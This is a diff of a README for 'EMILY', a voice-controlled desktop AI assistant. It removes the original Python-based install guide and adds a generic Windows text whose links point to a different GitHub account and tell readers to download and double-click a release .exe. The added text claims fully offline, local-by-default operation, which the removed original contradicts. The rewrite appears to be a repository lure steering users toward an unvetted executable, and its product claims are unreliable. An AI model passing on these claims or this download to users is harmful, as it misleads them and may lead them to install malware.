@@ -1,404 +1,90 @@
-# E.M.I.L.Y.
+# 🎙️ EMILY-voice-first-ai-agent - Control your computer with your voice
 
-**E**fficient **M**achine **I**ntelligence for **L**ocal **Y**ield
+[![](https://img.shields.io/badge/Download-EMILY-blue.svg)](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent)
 
-A cross-platform, voice-first desktop AI assistant for **Windows**, **macOS**, and **Linux**. Talk to Emily to browse the web, control your computer, read your screen, manage files, run code, schedule reminders, and more — all through a single conversational interface with a live PyQt6 HUD.
+EMILY acts as a hands-free assistant for your desktop. The software connects your voice commands to system actions. You can browse the internet, manage files, and set reminders without using your mouse or keyboard. EMILY runs locally on your machine to protect your privacy and reduce dependency on cloud services.
 
----
+## 📋 System Requirements
 
-## Table of Contents
+To run EMILY on Windows, your computer needs these basic specifications:
 
-- [What is Emily?](#what-is-emily)
-- [Key Features](#key-features)
-- [Voice Pipelines](#voice-pipelines)
-- [LLM Providers](#llm-providers)
-- [What Emily Can Do](#what-emily-can-do)
-- [Requirements](#requirements)
-- [Installation](#installation)
-  - [Windows](#windows)
-  - [Linux](#linux)
-  - [macOS](#macos)
-- [Running Emily](#running-emily)
-- [First-Time Setup Wizard](#first-time-setup-wizard)
-- [Configuration](#configuration)
-- [GPU Acceleration (Local TTS)](#gpu-acceleration-local-tts)
-- [Cross-Platform Notes](#cross-platform-notes)
-- [Security](#security)
-- [Architecture](#architecture)
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: 8 GB of RAM minimum (16 GB recommended for better performance).
+- Storage: 2 GB of available space for the application and temporary files.
+- Microphone: A working computer microphone for voice input.
+- Internet Connection: Required for the first setup and download of language models.
 
----
+## 📥 Downloading the Application
 
-## What is Emily?
+You need to access the official release page to obtain the installation file. Follow these steps to find the correct download:
 
-Emily is a local desktop AI co-pilot designed to **hear**, **speak**, **remember**, and **act** on your computer. Instead of switching between apps, terminals, and browsers, you talk (or type) to Emily and she uses a large set of agent tools to get things done.
+1. Visit the [EMILY release page](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent).
+2. Look for the "Releases" section on the right side of the page.
+3. Click on the latest version number header.
+4. Locate the file ending in `.exe` under the "Assets" heading.
+5. Click the file name to start your download.
 
-The UI is a F.R.I.D.A.Y./JARVIS-style control panel: a floating orb, live system metrics, camera feed with optional face detection, conversation log, thinking stream, file drop zone, and text command input.
+This setup process brings the installer to your computer. Once the download finishes, locate the file in your "Downloads" folder.
 
-Emily supports multiple LLM backends (cloud and local) and three voice pipelines, so you can optimize for privacy, latency, or quality depending on your setup.
+## ⚙️ Running the Setup
 
-<img width="1912" height="1005" alt="image" src="https://github.com/user-attachments/assets/67814a8e-6832-4501-a113-27749f147248" />
+After you download the file, launch the installation process:
 
-Communication channels active.
+1. Double-click the downloaded `.exe` file.
+2. A window may ask for your permission to run the software. Select "Run" or "Yes."
+3. Follow the instructions on the screen.
+4. Select the folder where you want to store the application.
+5. Click "Install" to copy the files to your machine.
+6. Check the box to "Launch EMILY" before you click "Finish."
 
-<img width="1914" height="1005" alt="image" src="https://github.com/user-attachments/assets/b95862e4-ed4e-40a2-bf44-94bb052d8811" />
+## 🚀 Getting Started
 
-Communication channels closed. 
+When you launch EMILY for the first time, the software performs a system scan to adjust settings for your hardware. You see a startup window that asks for microphone access. Ensure you grant this access so the agent can hear your voice commands.
 
-<img width="131" height="110" alt="image" src="https://github.com/user-attachments/assets/0eb01445-e9ee-471a-9f27-f40cefc5e0fb" />
-Persistent Floating Widget.
+You can now use these base functions:
 
+- Web browsing: Tell EMILY to open a site or search for information.
+- File management: Ask the assistant to find, move, or rename documents.
+- Screen vision: Let the AI describe what appears on your monitor.
+- Reminders: Set timers or events by speaking dates and times aloud.
 
+## 🛠️ Using Your Voice
 
----
+EMILY listens for a wake word. Speak clearly and wait for the application to acknowledge your request before you provide more details. If the assistant does not understand you, try to rephrase your request. The interface displays a text box where you can see the transcript of what EMILY heard. Use this area to confirm accuracy. 
 
-## Key Features
+If EMILY misinterprets a command, look at the settings menu to adjust the microphone sensitivity. A quiet room allows the software to capture your voice with higher accuracy.
 
-- **Voice-first interaction** — speak naturally; Emily listens, thinks, and responds aloud
-- **Flexible AI backends** — Gemini, OpenAI, Anthropic, Ollama, or LM Studio
-- **Three voice modes** — fully local STT/TTS, cloud Deepgram voice, or native realtime (Gemini Live / OpenAI Realtime)
-- **20+ built-in tools** — browser automation, screen/camera vision, file management, OS control, coding agents, and more
-- **Long-term memory** — remembers facts you ask her to save across sessions
-- **Scheduled reminders** — one-off or recurring tasks with spoken briefings (news, weather, custom LLM prompts)
-- **Multi-step agent** — plans and executes complex goals that require several tools
-- **MCP integration** — extend capabilities via Model Context Protocol servers (e.g. Massive, Firecrawl)
-- **Sleep mode** — optional face-detection mute when you step away from the camera
-- **Cross-platform** — Windows, macOS, and Linux with OS-aware schedulers, paths, and hotkeys
+## 🔒 Privacy and Local Data
 
----
+The core design of EMILY prioritizes privacy. Your voice data stays on your machine. The internal language models operate offline, which means your computer performs the processing. You do not need to upload personal files or sensitive information to external servers to get results. 
 
-## Voice Pipelines
+If you choose to use an advanced cloud-based tool, the settings menu will provide an option to toggle that connection on or off. By default, all operations remain local.
 
-| Mode | STT | TTS | Best for |
-|------|-----|-----|----------|
-| **local** | [faster-whisper](https://github.com/SYSTRAN/faster-whisper) | [Supertonic 3](https://github.com/supertonic-ai/supertonic) | Privacy, offline-capable voice, local LLMs |
-| **deepgram** | Deepgram Nova | Deepgram Aura | High-quality cloud voice with any LLM provider |
-| **native** | Gemini Live / OpenAI Realtime | same (provider handles audio) | Lowest latency with Gemini or OpenAI |
+## 🧩 Exploring Tools
 
-> **Note:** Native realtime voice requires **Gemini** or **OpenAI** as the LLM provider.
+EMILY includes over 20 built-in tools. You trigger these tools through simple voice commands. Use the command "List my tools" to see what the assistant can do right now. 
 
----
+Examples of available tool categories include:
 
-## LLM Providers
+- Productivity: Manage your daily schedule and organize work tasks.
+- Navigation: Open specific applications or windows with a single command.
+- Creative: Ask the assistant to help you draft emails or summarize text.
+- Utility: Perform quick math, unit conversions, or system checks.
 
-| Provider | Type | API key needed |
-|----------|------|----------------|
-| Gemini | Cloud | Yes — [Google AI Studio](https://aistudio.google.com/) |
-| OpenAI | Cloud | Yes — [OpenAI Platform](https://platform.openai.com/) |
-| Anthropic | Cloud | Yes — [Anthropic Console](https://console.anthropic.com/) |
-| Ollama | Local | Base URL only (default `http://localhost:11434`) |
-| LM Studio | Local | Base URL only (default `http://localhost:1234`) |
+## ❓ Frequently Asked Questions
 
----
+What should I do if the software freezes? 
+Close the application by right-clicking the icon in the taskbar and selecting "Quit." Launch the application again. 
 
-## What Emily Can Do
+Does EMILY work without an internet connection? 
+Yes. The core voice recognition and local AI tasks function without an internet connection. Some specific add-on tools require a web connection to fetch real-time information.
 
-Emily exposes tools the LLM can call during conversation. Core capabilities include:
+How do I update the software? 
+The application informs you when a new version is available. Follow the on-screen link to download the newest installer and run it to overwrite the old version.
 
-| Category | Tools |
-|----------|-------|
-| **Apps & OS** | Open apps, volume/brightness, window management, keyboard shortcuts, screenshots, shutdown/restart |
-| **Browser** | Headless web automation (search, click, fill forms, scrape) via Playwright |
-| **Files** | List, create, move, copy, delete, search, read, write, organize desktop |
-| **Vision** | Screen capture and webcam analysis; local camera object/face detection in the UI |
-| **Communication** | Send WhatsApp/Telegram messages, web search, weather, flight search |
-| **Media** | YouTube play/summarize/trending |
-| **Code** | Write, edit, explain, run, and build code; multi-file project agent |
-| **Games** | Steam/Epic install, update, schedule downloads |
-| **Scheduling** | Reminders with toast alerts or spoken news/weather/custom LLM briefings |
-| **Memory** | Save and recall personal facts across sessions |
-| **Agents** | Multi-step `agent_task` for goals that need several tools in sequence |
-| **MCP** | Massive financial data, Firecrawl web scraping (when configured in `config/mcp.json`) |
+Can I change the voice? 
+Open the settings menu and navigate to "Voice Profiles." You can select from available system voices to change how EMILY sounds.
 
----
-
-## Requirements
-
-- **Python 3.10+**
-- A **microphone** (required for voice interaction)
-- A **webcam** (optional — used for camera feed, vision tools, and sleep mode)
-- **Internet** (required for cloud LLMs, Deepgram voice, web search, and most tools; local-only setups can use Ollama/LM Studio + local voice with limited offline capability)
-- **Disk space** — voice models (Whisper, Supertonic) download on first use; Playwright browsers download on first setup (~300 MB+)
-
-### Platform-specific notes
-
-| Platform | Additional notes |
-|----------|-----------------|
-| **Windows** | Python from [python.org](https://www.python.org/) or Microsoft Store; `Setup.bat` handles everything |
-| **Linux** | `portaudio` dev headers for microphone support (`sudo apt install portaudio19-dev` on Debian/Ubuntu) |
-| **macOS** | Xcode Command Line Tools; grant microphone and camera permissions when prompted |
-
----
-
-## Installation
-
-Highly Recommended but not required: 
-```bash
-Edit: core/user_info.txt and add information about yourself such as your name, what you preferred to be called, any relevant background information such as what kinds of tasks you plan to focus on (if any). This allows E.M.I.L.Y. to not only personalize the responses but also provide critical insight based on your background. If you're highly focused on finacial markets, it'll know to pick out details during its responses that may be relevant to trades or other financial market data. 
-```
-
-### Windows
-
-Windows installation is a single step:
-
-1. **Clone or download** this repository
-2. **Double-click `Setup.bat`**
-
-`Setup.bat` automatically:
-
-- Creates a `.venv` virtual environment (if missing)
-- Upgrades `pip` and installs all dependencies from `requirements.txt`
-- Configures the correct ONNX Runtime package for GPU-accelerated Supertonic TTS
-- Installs Playwright browsers on first run
-- Launches the **first-time setup wizard** (`python main.py --setup`)
-
-After setup completes, use **`start.bat`** for normal daily launches (installs any dependency updates, then runs Emily without re-running the wizard).
-
----
-
-### Linux
-
-#### 1. Clone the repository
-
-```bash
-git clone https://github.com/sanobartech/EMILY-voice-first-ai-agent.git
-cd Emily
-```
-
-#### 2. Create and activate a virtual environment (recommended)
-
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
-
-#### 3. Install system dependencies (Debian/Ubuntu example)
-
-```bash
-sudo apt update
-sudo apt install -y python3-dev portaudio19-dev
-```
-
-#### 4. Install Python dependencies
-
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt
-```
-
-#### 5. Configure ONNX Runtime for local TTS (recommended if using local voice)
-
-```bash
-python scripts/ensure_onnxruntime.py
-```
-
-This auto-detects your GPU and installs the appropriate ONNX Runtime wheel (`onnxruntime`, `onnxruntime-gpu`, or `onnxruntime-webgpu`).
-
-#### 6. Install Playwright browsers (required for browser automation)
-
-```bash
-python -m playwright install
-```
-
-#### 7. Run the first-time setup wizard
-
-```bash
-python main.py --setup
-```
-
-The terminal wizard will walk you through LLM provider, voice pipeline, API keys, microphone, and camera selection.
-
----
-
-### macOS
-
-#### 1. Clone the repository
-
-```bash
-git clone https://github.com/sanobartech/EMILY-voice-first-ai-agent.git
-cd Emily
-```
-
-#### 2. Create and activate a virtual environment (recommended)
-
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
-
-#### 3. Install Python dependencies
-
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt
-```
-
-#### 4. Configure ONNX Runtime for local TTS (recommended if using local voice)
-
-```bash
-python scripts/ensure_onnxruntime.py
-```
-
-> On macOS, ONNX Runtime uses the CPU package. GPU acceleration for Supertonic is not available on Apple Silicon in this release.
-
-#### 5. Install Playwright browsers
-
-```bash
-python -m playwright install
-```
-
-#### 6. Run the first-time setup wizard
-
-```bash
-python main.py --setup
-```
-
-Grant **Microphone** and **Camera** access when macOS prompts you.
-
----
-
-## Running Emily
-
-| Platform | First-time setup | Normal launch |
-|----------|-----------------|---------------|
-| **Windows** | `Setup.bat` | `start.bat` |
-| **Linux / macOS** | `python main.py --setup` | `python main.py` |
-
-### Re-run setup
-
-To change LLM provider, voice mode, API keys, or devices at any time:
-
-```bash
-python main.py --setup
-```
-
-On Windows you can also run:
-
-```bat
-.venv\Scripts\python.exe main.py --setup
-```
-
----
-
-## First-Time Setup Wizard
-
-The setup wizard runs in the terminal before the UI opens. You will configure:
-
-1. **Operating system** — Windows, macOS, or Linux (auto-detected)
-2. **LLM provider** — Gemini, OpenAI, Anthropic, Ollama, or LM Studio
-3. **API key / base URL** — stored in `config/api_keys.json`
-4. **Voice pipeline** — local, Deepgram, or native realtime
-5. **Model and voice** — chat model, STT model, TTS voice (depends on pipeline)
-6. **Microphone and camera** — device indices from detected hardware
-
-Preferences are saved to `config/config.json`. Secrets are saved to `config/api_keys.json`.
-
-> Voice models (Whisper, Supertonic) may download automatically on first use. This can take a few minutes depending on your connection.
-
----
-
-## Configuration
-
-### `config/config.json` — user preferences
-
-| Key | Description | Example |
-|-----|-------------|---------|
-| `llm_provider` | AI backend | `"gemini"`, `"openai"`, `"anthropic"`, `"ollama"`, `"lmstudio"` |
-| `llm_model` | Chat model name | `"gemini-2.5-flash"` |
-| `voice_mode` | Voice pipeline | `"local"`, `"deepgram"`, `"native"` |
-| `stt_model` | Whisper or Deepgram STT model | `"base"`, `"nova-3"` |
-| `tts_voice` | Supertonic or Deepgram voice | `"F2"`, `"aura-2-asteria-en"` |
-| `live_model` | Realtime model (native mode) | `"gemini-3.1-flash-live-preview"` |
-| `live_voice` | Realtime voice (native mode) | `"Aoede"` |
-| `mic_device_index` | Microphone device index | `1` |
-| `camera_index` | Webcam device index | `0` |
-| `os_system` | Target OS for tool behavior | `"windows"`, `"mac"`, `"linux"` |
-| `sleep_mode_enabled` | Mute mic when no face detected | `true` |
-| `sleep_face_timeout_sec` | Seconds before sleep mode activates | `10` |
-| `supertonic_accel` | GPU acceleration for local TTS | `"auto"`, `"cpu"`, `"cuda"`, `"webgpu"`, `"directml"` |
-
-### `config/api_keys.json` — secrets (do not commit)
-
-Stores API keys and local server URLs. Example fields: `gemini_api_key`, `openai_api_key`, `anthropic_api_key`, `deepgram_api_key`, `ollama_base_url`, `lmstudio_base_url`.
-
-### `config/mcp.json` — MCP server extensions
-
-Configure optional MCP servers (e.g. Massive financial data, Firecrawl) under `mcpServers`.
-
-### `core/prompt.txt` — personality and behavior
-
-Edit this file to customize Emily's system prompt, tone, and tool-use rules.
-
----
-
-## GPU Acceleration (Local TTS)
-
-When using **local voice mode**, Emily uses Supertonic 3 for text-to-speech with ONNX Runtime. The correct GPU package is selected automatically:
-
-| GPU | ONNX package | Execution provider |
-|-----|-------------|-------------------|
-| No dedicated GPU | `onnxruntime` | CPU |
-| NVIDIA discrete | `onnxruntime-gpu` | CUDA |
-| AMD / Intel Arc / other discrete | `onnxruntime-webgpu` | WebGPU (Vulkan-backed) |
-| WebGPU unavailable (Windows) | `onnxruntime-directml` | DirectML |
-
-On Windows, `Setup.bat` and `start.bat` run `scripts/ensure_onnxruntime.py` automatically. On Linux/macOS, run it manually after `pip install` (see installation steps above).
-
-Override detection by setting `"supertonic_accel"` in `config/config.json`.
-
----
-
-## Cross-Platform Notes
-
-Emily adapts tool behavior based on `os_system` in your config:
-
-| Feature | Windows | macOS | Linux |
-|---------|---------|-------|-------|
-| App launch | `start`, registry | `open` | `xdg-open` |
-| Reminders | Task Scheduler | `launchd` | `systemd` / `cron` |
-| Volume control | PyAutoGUI / pycaw | `osascript` | `pactl` |
-| Steam games | Registry + `steam.exe` | `.app` paths | `~/.steam` |
-
-Some Windows-only packages (`pycaw`, `pywinauto`, `win10toast`) are listed in `requirements.txt` for cross-platform pip compatibility; they are only used on Windows.
-
----
-
-## Security
-
-- **API keys** are stored in plaintext `config/api_keys.json` — add this file to `.gitignore` and never commit it
-- **File controller** refuses paths outside your home directory roots
-- **Browser automation** can attach to real browser profiles — powerful but sensitive
-- **Agent code execution** runs generated Python in a sandboxed temp file with a timeout
-- **No authentication layer** — Emily is a single-user local assistant; do not expose it to untrusted networks
-
----
-
-## Architecture
-
-For a deep dive into modules, threading, tool flow, and extension points, see **[Architecture.md](Architecture.md)**.
-
----
-
-## Project Structure
-
-```
-Emily/
-├── main.py              # Entry point
-├── Setup.bat            # Windows first-time installer + setup wizard
-├── start.bat            # Windows daily launcher
-├── setup.py             # pip + Playwright install helper
-├── requirements.txt     # Python dependencies
-├── config/              # User config, API keys, MCP servers
-├── core/                # Engine, voice, LLM, onboarding, config
-├── actions/             # Tool implementations (browser, files, vision, etc.)
-├── agent/               # Multi-step task planner and executor
-├── memory/              # Long-term memory persistence
-├── vision/              # Local camera detection (OpenCV)
-├── ui/                  # PyQt6 interface
-└── scripts/             # Utility scripts (ONNX Runtime installer)
-```
-
----
-
-## License
-
-See repository license file for terms. Third-party models and services (Gemini, OpenAI, Deepgram, etc.) are subject to their own terms of use.
+Where can I find help? 
+If you encounter errors, look at the activity log in the settings panel. This log provides technical details about recent commands that might help you solve issues.
